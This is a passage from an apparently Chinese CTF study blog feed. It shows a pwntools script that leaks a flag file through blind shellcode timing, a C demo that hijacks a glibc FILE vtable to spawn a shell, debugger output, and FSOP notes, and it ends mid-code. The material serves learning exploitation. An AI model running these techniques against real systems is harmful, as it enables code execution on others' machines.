class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">find</span>(<span class="params">i, c</span>):</span><br><span class="line">        <span class="keyword">global</span> io</span><br><span class="line">        io=remote(<span class="string">&quot;&quot;</span>,)</span><br><span class="line">        <span class="comment">#io=process(&#x27;./pwn&#x27;)</span></span><br><span class="line">        sc=asm(<span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        mov rax, 0</span></span><br><span class="line"><span class="string">        movabs rax, 0x67616C66</span></span><br><span class="line"><span class="string">        push 0</span></span><br><span class="line"><span class="string">        push rax</span></span><br><span class="line"><span class="string">        push rsp</span></span><br><span class="line"><span class="string">        pop rdi</span></span><br><span class="line"><span class="string">        xor rsi, rsi</span></span><br><span class="line"><span class="string">        xor rdx, rdx</span></span><br><span class="line"><span class="string">        mov rax, 2</span></span><br><span class="line"><span class="string">        syscall </span></span><br><span class="line"><span class="string">        mov rsi, rdi</span></span><br><span class="line"><span class="string">        mov rdi, rax</span></span><br><span class="line"><span class="string">        xor rax, rax</span></span><br><span class="line"><span class="string">        mov rdx, 0x100</span></span><br><span class="line"><span class="string">        syscall </span></span><br><span class="line"><span class="string">        mov al, [rsp+&#123;&#125;]</span></span><br><span class="line"><span class="string">        cmp al, &#123;&#125;</span></span><br><span class="line"><span class="string">        jbe $</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span>.<span class="built_in">format</span>(i, c))</span><br><span class="line">        io.send(sc)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">                io.recv(timeout=<span class="number">3</span>)</span><br><span class="line">                io.close()</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">        <span class="keyword">except</span> EOFError:</span><br><span class="line">                io.close()</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line">i=<span class="number">6</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        l = <span class="number">0x20</span></span><br><span class="line">        r = <span class="number">0x80</span></span><br><span class="line">        <span class="keyword">while</span> l &lt;= r:</span><br><span class="line">                m = (l + r) // <span class="number">2</span></span><br><span class="line">                <span class="keyword">if</span> find(i, m):</span><br><span class="line">                        r = m - <span class="number">1</span></span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                        l = m + <span class="number">1</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> l==<span class="number">0</span>:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="built_in">print</span>(l)</span><br><span class="line">        flag += <span class="built_in">chr</span>(l)</span><br><span class="line">        info(<span class="string">&quot;win!!!!!!!!!!!!!!!!!!!!!!!!! &quot;</span>)</span><br><span class="line">        info(flag)</span><br><span class="line">        i += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">info(<span class="string">&quot;flag: &quot;</span>+flag)</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> pwn </category>
          
          <category> shellcode </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 复现 </tag>
            
            <tag> 笔记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>劫持vtable以及FSOP</title>
      <link href="/2025/07/27/%E5%8A%AB%E6%8C%81vtable%E4%BB%A5%E5%8F%8AFSOP/"/>
      <url>/2025/07/27/%E5%8A%AB%E6%8C%81vtable%E4%BB%A5%E5%8F%8AFSOP/</url>
      
        <content type="html"><![CDATA[<h2 id="0x00"><a href="#0x00" class="headerlink" title="0x00"></a>0x00</h2><p>参考博客<br><a href="https://xz.aliyun.com/news/5139">IO FILE 之劫持vtable及FSOP-先知社区</a><br><a href="https://blog.csdn.net/Mr_Fmnwon/article/details/144964917">【我的 PWN 学习手札】IO_FILE 之 FSOP_fsop pwn-CSDN博客</a><br><a href="https://blog.csdn.net/Mr_Fmnwon/article/details/145820668">【我的 PWN 学习手札】IO_FILE 之 劫持vtable到_IO_str_jumps_pwn vtable-CSDN博客</a><br><a href="https://blog.csdn.net/qq_45323960/article/details/123810198?spm=1001.2014.3001.5501">linux IO_FILE 利用_io list all结构体-CSDN博客</a><br></p><p>因为vtable check机制的引入，直接劫持vtable和简单的FSOP在glibc2.24+就已经失效了，如下<br></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_MAGIC_MASK     0xFFFF0000</span></span><br><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">const</span> <span class="keyword">struct</span> _IO_jump_t *<span class="title function_">IO_validate_vtable</span><span class="params">(<span class="type">const</span> <span class="keyword">struct</span> _IO_jump_t *vtable)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">uintptr_t</span> ptr = (<span class="type">uintptr_t</span>) vtable;</span><br><span class="line">  <span class="type">uintptr_t</span> offset = ptr - (<span class="type">uintptr_t</span>) &amp;__io_vtables;</span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely(offset &gt;= IO_VTABLES_LEN))</span><br><span class="line">    _IO_vtable_check();</span><br><span class="line">  <span class="keyword">return</span> vtable;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//只有当 vtable 指针位于 __io_vtables 段内时，才算“合法”，否则进入慢路径进一步检查或 abort()</span></span><br><span class="line"><span class="type">void</span> _IO_vtable_check(<span class="type">void</span>)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">// Shared glibc 中，如果 accept flag 被设置为 __IO_vtable_check 本身，则跳过</span></span><br><span class="line">  <span class="keyword">if</span> (flag == &amp;_IO_vtable_check) <span class="keyword">return</span>;</span><br><span class="line">  <span class="comment">// 或者跨 namespace 使用动态加载，也可能绕过</span></span><br><span class="line">  <span class="keyword">if</span> (within dlopen context) <span class="keyword">return</span>;</span><br><span class="line">  __libc_fatal(<span class="string">&quot;Fatal error: glibc detected an invalid stdio handle\n&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>所以要继续进行利用就需要结合其他更间接高级的技巧<br>姑且先记录一下基础利用吧<br></p><h2 id="0x01-劫持vtable"><a href="#0x01-劫持vtable" class="headerlink" title="0x01 劫持vtable"></a>0x01 劫持vtable</h2><p>在此前已经介绍过<code>vtable</code>，它存放着IO函数进行IO操作时候会调用的一些函数指针<br>如果能够控制<code>_IO_FILE_plus</code>结构体，实现对<code>vtable</code>指针的修改，使得<code>vtable</code>指向可控的内存，在该内存中构造好<code>vtable</code>，再通过调用相应IO函数，触发<code>vtable</code>函数的调用，即可劫持程序执行流<br>而要劫持<code>vtable</code>，一般有两种方式：一是直接修改（一般<code>vtable</code>都是不可写入的），二是伪造整个<code>_IO_FILE_plus</code>或者修改<code>vtable</code>指针。<br>在64位系统下<code>vtable</code>在<code>_IO_FILE_plus</code>中的偏移为0xd8。<code>vtable</code>中的函数调用时候都会把<code>_IO_FILE_plus</code>指针作为参数，故而只需要在<code>_IO_FILE_plus</code>头部写入<code>&#39;sh\x00&#39;</code>或者<code>&#39;bin/sh\x00&#39;</code>，再劫持<code>vtable</code>中对应的函数为<code>system</code>函数即可。<br>也可以直接劫持为<code>one_gadget</code><br>接下来写个demo运行验证一下（ glibc2.23 版本下，位于 libc 数据段的 vtable 是不可以进行写入的。不过，通过在可控的内存中伪造 vtable 的方法依然可以实现利用）<br></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    FILE *fp;</span><br><span class="line">    <span class="type">long</span> <span class="type">long</span> *vtable_addr,*fake_vtable;</span><br><span class="line"></span><br><span class="line">    fp=fopen(<span class="string">&quot;123.txt&quot;</span>,<span class="string">&quot;rw&quot;</span>);</span><br><span class="line">    fake_vtable=<span class="built_in">malloc</span>(<span class="number">0x40</span>);</span><br><span class="line"></span><br><span class="line">    vtable_addr=(<span class="type">long</span> <span class="type">long</span> *)((<span class="type">long</span> <span class="type">long</span>)fp+<span class="number">0xd8</span>);     <span class="comment">//vtable offset</span></span><br><span class="line"></span><br><span class="line">    vtable_addr[<span class="number">0</span>]=(<span class="type">long</span> <span class="type">long</span>)fake_vtable;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memcpy</span>(fp,<span class="string">&quot;sh&quot;</span>,<span class="number">3</span>);</span><br><span class="line"></span><br><span class="line">    fake_vtable[<span class="number">7</span>]=&amp;system; <span class="comment">//xsputn</span></span><br><span class="line"></span><br><span class="line">    fwrite(<span class="string">&quot;hi&quot;</span>,<span class="number">2</span>,<span class="number">1</span>,fp);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们先查看fp指针指向的新建的<code>_IO_FILE_plus</code><br></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p fp</span><br><span class="line">$6 = (FILE *) 0x5ecb5d787010</span><br><span class="line">pwndbg&gt; x/30gx 0x5ecb5d787010</span><br><span class="line">0x5ecb5d787010: 0x00000000fbad2488      0x0000000000000000</span><br><span class="line">0x5ecb5d787020: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x5ecb5d787030: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x5ecb5d787040: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x5ecb5d787050: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x5ecb5d787060: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x5ecb5d787070: 0x0000000000000000      0x0000721dfecd3540</span><br><span class="line">0x5ecb5d787080: 0x0000000000000003      0x0000000000000000</span><br><span class="line">0x5ecb5d787090: 0x0000000000000000      0x00005ecb5d7870f0</span><br><span class="line">0x5ecb5d7870a0: 0xffffffffffffffff      0x0000000000000000</span><br><span class="line">0x5ecb5d7870b0: 0x00005ecb5d787100      0x0000000000000000</span><br><span class="line">0x5ecb5d7870c0: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x5ecb5d7870d0: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x5ecb5d7870e0: 0x0000000000000000      0x0000721dfecd16e0</span><br><span class="line">0x5ecb5d7870f0: 0x0000000000000000      0x0000000000000000</span><br><span class="line">pwndbg&gt; x/22gx 0x0000721dfecd16e0</span><br><span class="line">0x721dfecd16e0 &lt;_IO_file_jumps&gt;:        0x0000000000000000      0x0000000000000000</span><br><span class="line">0x721dfecd16f0 &lt;_IO_file_jumps+16&gt;:     0x0000721dfe9879d0      0x0000721dfe988740</span><br><span class="line">0x721dfecd1700 &lt;_IO_file_jumps+32&gt;:     0x0000721dfe9884b0      0x0000721dfe989610</span><br><span class="line">0x721dfecd1710 &lt;_IO_file_jumps+48&gt;:     0x0000721dfe98a990      0x0000721dfe9871f0</span><br><span class="line">0x721dfecd1720 &lt;_IO_file_jumps+64&gt;:     0x0000721dfe986ed0      0x0000721dfe9864d0</span><br><span class="line">0x721dfecd1730 &lt;_IO_file_jumps+80&gt;:     0x0000721dfe989a10      0x0000721dfe986440</span><br><span class="line">0x721dfecd1740 &lt;_IO_file_jumps+96&gt;:     0x0000721dfe986380      0x0000721dfe97b190</span><br><span class="line">0x721dfecd1750 &lt;_IO_file_jumps+112&gt;:    0x0000721dfe9871b0      0x0000721dfe986b80</span><br><span class="line">0x721dfecd1760 &lt;_IO_file_jumps+128&gt;:    0x0000721dfe986980      0x0000721dfe986350</span><br><span class="line">0x721dfecd1770 &lt;_IO_file_jumps+144&gt;:    0x0000721dfe986b70      0x0000721dfe98ab00</span><br><span class="line">0x721dfecd1780 &lt;_IO_file_jumps+160&gt;:    0x0000721dfe98ab10      0x0000000000000000</span><br></pre></td></tr></table></figure><p>可以看到此时<code>fp+0xd8</code>处即0x5ecb5d787010+0xd8&#x3D;0x5ecb5d7870e8处此时还是正常的<code>vtable</code><br>接下来执行<code> vtable_addr[0]=(long long)fake_vtable;</code>，将<code>vtable</code>指针修改到可控的chunk地址<br></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p fake_vtable</span><br><span class="line">$7 = (long long *) 0x5ecb5d787240</span><br><span class="line">pwndbg&gt; x/30gx 0x5ecb5d787010</span><br><span class="line">0x5ecb5d787010: 0x00000000fbad2488      0x0000000000000000</span><br><span class="line">0x5ecb5d787020: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x5ecb5d787030: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x5ecb5d787040: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x5ecb5d787050: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x5ecb5d787060: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x5ecb5d787070: 0x0000000000000000      0x0000721dfecd3540</span><br><span class="line">0x5ecb5d787080: 0x0000000000000003      0x0000000000000000</span><br><span class="line">0x5ecb5d787090: 0x0000000000000000      0x00005ecb5d7870f0</span><br><span class="line">0x5ecb5d7870a0: 0xffffffffffffffff      0x0000000000000000</span><br><span class="line">0x5ecb5d7870b0: 0x00005ecb5d787100      0x0000000000000000</span><br><span class="line">0x5ecb5d7870c0: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x5ecb5d7870d0: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x5ecb5d7870e0: 0x0000000000000000      0x00005ecb5d787240</span><br><span class="line">0x5ecb5d7870f0: 0x0000000000000000      0x0000000000000000</span><br><span class="line">pwndbg&gt; x/22gx 0x00005ecb5d787240</span><br><span class="line">0x5ecb5d787240: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x5ecb5d787250: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x5ecb5d787260: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x5ecb5d787270: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x5ecb5d787280: 0x0000000000000000      0x0000000000020d81</span><br><span class="line">0x5ecb5d787290: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x5ecb5d7872a0: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x5ecb5d7872b0: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x5ecb5d7872c0: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x5ecb5d7872d0: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x5ecb5d7872e0: 0x0000000000000000      0x0000000000000000</span><br></pre></td></tr></table></figure><p>可以看到此时<code>fp+0xd8</code>处已经变成了我们申请的chunk地址（0x5ecb5d787240）<br>接下来将“&#x2F;bin&#x2F;sh”写入fp，并修改fake_vtable中的<code>__xsputn</code>函数指针（第八表项，具体见我记录<code>_IO_FILE</code>基础知识的<a href="https://r3t2.top/2025/07/27/%E5%85%B3%E4%BA%8E-IO-FILE/">博客</a>中关于虚表的笔记）为system地址<br></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/22gx 0x00005ecb5d787240</span><br><span class="line">0x5ecb5d787240: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x5ecb5d787250: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x5ecb5d787260: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x5ecb5d787270: 0x0000000000000000      0x0000721dfe9533a0</span><br><span class="line">0x5ecb5d787280: 0x0000000000000000      0x0000000000020d81</span><br><span class="line">0x5ecb5d787290: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x5ecb5d7872a0: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x5ecb5d7872b0: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x5ecb5d7872c0: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x5ecb5d7872d0: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x5ecb5d7872e0: 0x0000000000000000      0x0000000000000000</span><br><span class="line">pwndbg&gt; p system</span><br><span class="line">$8 = &#123;&lt;text variable, no debug info&gt;&#125; 0x721dfe9533a0 &lt;system&gt;</span><br><span class="line">pwndbg&gt; p *fp</span><br><span class="line">$9 = &#123;</span><br><span class="line">  _flags = 1852400175,</span><br><span class="line">  _IO_read_ptr = 0x0,</span><br><span class="line">  _IO_read_end = 0x0,</span><br><span class="line">  _IO_read_base = 0x0,</span><br><span class="line">  _IO_write_base = 0x0,</span><br><span class="line">  _IO_write_ptr = 0x0,</span><br><span class="line">  _IO_write_end = 0x0,</span><br><span class="line">  _IO_buf_base = 0x0,</span><br><span class="line">  _IO_buf_end = 0x0,</span><br><span class="line">  _IO_save_base = 0x0,</span><br><span class="line">  _IO_backup_base = 0x0,</span><br><span class="line">  _IO_save_end = 0x0,</span><br><span class="line">  _markers = 0x0,</span><br><span class="line">  _chain = 0x721dfecd3540 &lt;_IO_2_1_stderr_&gt;,</span><br><span class="line">  _fileno = 3,</span><br><span class="line">  _flags2 = 0,</span><br><span class="line">  _old_offset = 0,</span><br><span class="line">  _cur_column = 0,</span><br><span class="line">  _vtable_offset = 0 &#x27;\000&#x27;,</span><br><span class="line">  _shortbuf = &quot;&quot;,</span><br><span class="line">  _lock = 0x5ecb5d7870f0,</span><br><span class="line">  _offset = -1,</span><br><span class="line">  _codecvt = 0x0,</span><br><span class="line">  _wide_data = 0x5ecb5d787100,</span><br><span class="line">  _freeres_list = 0x0,</span><br><span class="line">  _freeres_buf = 0x0,</span><br><span class="line">  __pad5 = 0,</span><br><span class="line">  _mode = 0,</span><br><span class="line">  _unused2 = &#x27;\000&#x27; &lt;repeats 19 times&gt;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>看到fp的<code>_flags</code>位写成了1852400175也就是0x6E69622F，”&#x2F;bin”的ASCII码的小端序存储（<del>其实这里直接写”sh”更直观一点，因为flag位只有四字节，但笔者懒得改了</del>），并且<code>__xsputn</code>函数指针的位置也改写成了<code>system</code>函数地址0x721dfe9533a0<br>接下来执行<code>fwrite</code>函数，其会以fp指针为参数调用虚表中的<code>__xsputn</code>函数，我们修改后也就相当于调用了<code>system(&quot;sh&quot;);</code><br>我们进入<code>fwrite</code>逐步调试发现确实进入了<code>system</code>函数</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">► 0x721dfe9533a0 &lt;system&gt;      test   rdi, rdi</span><br><span class="line">  0x721dfe9533a3 &lt;system+3&gt;    je     system+16                &lt;system+16&gt;</span><br><span class="line"></span><br><span class="line">  0x721dfe9533a5 &lt;system+5&gt;    jmp    0x721dfe952e30                &lt;0x721dfe952e30&gt;</span><br><span class="line">   ↓</span><br><span class="line">  0x721dfe952e30               push   r12</span><br><span class="line">  0x721dfe952e32               push   rbp</span><br><span class="line">  0x721dfe952e33               xor    eax, eax</span><br><span class="line">  0x721dfe952e35               push   rbx</span><br><span class="line">  0x721dfe952e36               mov    ecx, 0x10</span><br><span class="line">  0x721dfe952e3b               mov    rbx, rdi</span><br><span class="line">  0x721dfe952e3e               mov    esi, 1</span><br><span class="line">  0x721dfe952e43               sub    rsp, 0x170</span><br></pre></td></tr></table></figure><p>最后执行效果<br></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">[Attaching after process 149 fork to child process 158]</span><br><span class="line">[New inferior 2 (process 158)]</span><br><span class="line">[Detaching after fork from parent process 149]</span><br><span class="line">[Inferior 1 (process 149) detached]</span><br><span class="line">process 158 is executing new program: /usr/bin/dash</span><br><span class="line">Error in re-setting breakpoint 1: Function &quot;main&quot; not defined.</span><br><span class="line">[Attaching after process 158 fork to child process 159]</span><br><span class="line">[New inferior 3 (process 159)]</span><br><span class="line">[Detaching after fork from parent process 158]</span><br><span class="line">[Inferior 2 (process 158) detached]</span><br><span class="line">process 159 is executing new program: /usr/bin/dash</span><br><span class="line"># whoami</span><br><span class="line">[Attaching after process 159 fork to child process 160]</span><br><span class="line">[New inferior 4 (process 160)]</span><br><span class="line">[Detaching after fork from parent process 159]</span><br><span class="line">[Inferior 3 (process 159) detached]</span><br><span class="line">process 160 is executing new program: /usr/bin/whoami</span><br><span class="line">root</span><br><span class="line"># [Inferior 4 (process 160) exited normally]</span><br><span class="line"></span><br><span class="line">[1]+  Stopped                 gdb ./demo</span><br><span class="line">root@042a287ef431:/ctf/work#</span><br></pre></td></tr></table></figure><p>看到whoami指令返回了root（因为笔者这里实在docker容器里调试的，容器里默认是root，但是这里输出这么多行提示信息并且执行一次命令后便退出了是什么情况我也不是很清楚…）<br></p><h2 id="0x02-FSOP"><a href="#0x02-FSOP" class="headerlink" title="0x02 FSOP"></a>0x02 FSOP</h2><p>FSOP 是 File Stream Oriented Programming 的缩写，根据前面对 FILE 的介绍得知进程内所有的<code>_IO_FILE </code>结构会使用<code>_chain </code>域相互连接形成一个链表，这个链表的头部由<code>_IO_list_all </code>维护。<br>FSOP 的核心思想就是劫持<code>_IO_list_all </code>的值来伪造链表和其中的<code>_IO_FILE_plus</code>项，但是单纯的伪造只是构造了数据还需要某种方法进行触发。FSOP 选择的触发方法是调用<code>_IO_flush_all_lockp</code>，这个函数会刷新<code>_IO_list_all </code>链表中所有项的文件流，相当于对每个 FILE 调用 fflush，也对应着会调用<code>_IO_FILE_plus.vtable</code> 中的<code>_IO_overflow</code><br><code>_IO_flush_all_lockp</code>函数并不需要手动调用，当程序从<code>main</code>返回时，或者执行<code>exit</code>函数时，亦或者是libc执行<code>abort</code>流程时，<code>_IO_flush_all_lockp</code>会被系统调用<br>我们伪造的<code>_IO_FILE_plus</code>需要满足<code>_IO_flush_all_lockp</code>的执行条件，也就是<br></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (((fp-&gt;_mode &lt;= <span class="number">0</span> &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base))</span><br><span class="line">               &amp;&amp; _IO_OVERFLOW (fp, EOF) == EOF)</span><br><span class="line">           &#123;</span><br><span class="line">               result = EOF;</span><br><span class="line">          &#125;</span><br></pre></td></tr></table></figure><p>那么常规的攻击方法便是覆盖<code>_IO_list_all </code>为一个chunk地址，然后伪造一个<code>_IO_FILE_plus</code>结构体，亦或者是直接修改其指向的<code>_IO_FILE_plus</code>结构体（一般都是<code> _IO_2_1_stderr_</code>）<br>然后就是记录一下一个模版：引用自_sky123_师傅：<br>不妨将<code>vtable</code>伪造在<code>_IO_2_1_stderr_ + 0x10</code>处使<code>_IO_overflow</code>，<code> _IO_2_1_stderr_</code>的<code>fp-&gt;_IO_write_ptr</code>恰好对应于 <code>vtable</code> 的 <code>_IO_overflow</code> 。然后向<code>fp-&gt;_IO_write_ptr</code> 写入 <code>system</code>函数地址。由于<code>_IO_overflow</code>传入的参数为<code>_IO_2_1_stderr_</code>结构体，因此向其<code>_flags</code>处写入 <code>/bin/sh</code> 字符串<br>如下图所示<br></p><p><img src="/images/dd959c3c75c4474daa78787724d3a84e.png"></p><h2 id="0x03-glibc2-24-：劫持vtable到-IO-str-jumps以及house-of系列"><a href="#0x03-glibc2-24-：劫持vtable到-IO-str-jumps以及house-of系列" class="headerlink" title="0x03 glibc2.24+：劫持vtable到_IO_str_jumps以及house of系列"></a>0x03 glibc2.24+：劫持vtable到_IO_str_jumps以及house of系列</h2><p>我们重新看glibc2.24+<code>vtable</code>的check机制<br></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">const</span> <span class="keyword">struct</span> _IO_jump_t *</span><br><span class="line"><span class="title 